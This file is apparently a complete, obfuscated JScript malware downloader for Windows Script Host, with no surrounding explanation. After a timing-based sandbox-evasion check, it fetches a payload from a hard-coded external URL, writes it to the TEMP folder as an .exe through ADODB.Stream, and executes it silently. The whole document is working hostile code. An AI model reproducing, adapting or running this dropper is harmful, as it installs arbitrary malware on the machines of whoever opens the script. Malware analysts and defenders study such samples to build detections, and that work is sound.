var _R = false;
var _GI = "CreateObject";
var _Y1 = function _N() {return WScript[_GI]("WScript"+".Shell");}(), _ES = 11;
var _SG = "MSXML2.XMLHTTP";
var _J = 2123213;
var _H0 = 0;
function _Z(_RF){_Y1["Run"](_RF, _H0, _H0);};
function _TY(){return _SG + "";};
function _NW(_D0, _I0){_H0 = _H0 * 1; return _D0 - _I0;};
function _WM(){return _GI;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R = true;
  @end
@*/
if (_R)
{
var _N0 = "";
function _LK(){return 22;};
var _J0 = 0; var _UZ = 0;
function _YM()
{
var _D = new this["Date"]();
var _JU = _D["getUTCMilliseconds"]();
WScript["Sleep"](_LK());
var _D = new this["Date"]();
var _I = _D["getUTCMilliseconds"]();
WScript["Sleep"](_LK());
var _D = new this["Date"]();
var _P0 = _D["getUTCMilliseconds"]();
var _J0 = "_EV";
_J0 = _NW(_I, _JU);
var _UZ = "_RQ";
_UZ = _NW(_P0, _I);
_N0 = "open";
return _NW(_J0, _UZ);
}
var _CD = false;
var _PF = false;
for (var _CZ = _H0; _CZ < _LK() * 1; _CZ++){if (_YM() != _H0){
_CD = true; 
_UZ = "31" + 11 * _J0 + _UZ; 
_PF = true; 
break;
}}
function _E() {return ((_CD == true) && (_CD == _PF)) ? 1 : _H0;};
if (_CD && _E() && _PF){
function _Y() {return _Y1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1VntiVE4W.ex" + "e";};
 _EA = _TY();
 _ID = WScript[_GI](_EA);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_ID[_N0]("GET", "http://ru-optovik.ru/j9ssl", false);
		_ID["send"]();
		_Y0 = "Sleep";
	}
	WScript[_Y0](_LK() + 120); 
	if (_ID["readystate"] < 2 * 2) continue;
	_P = _H0;
	function _H(_S) {var _YR = (1, 2, 3, 4, 5, _S); return _YR;};
	_R0 = WScript[_WM()]("ADODB.Stream");
	_EA = _R0;
	_EA[_N0]();
	_EA["type"] = _H(1);
	_EA["write"](_ID["ResponseBody"]);
	_R0["position"] = _H(_H0);
	_EA["Save" + "ToFile"](_Y(), 2);
	_R0["cl"+"ose"]();
	_FQ = _Y();
	_Z(_FQ);
} catch(_FG){};
}
}
}

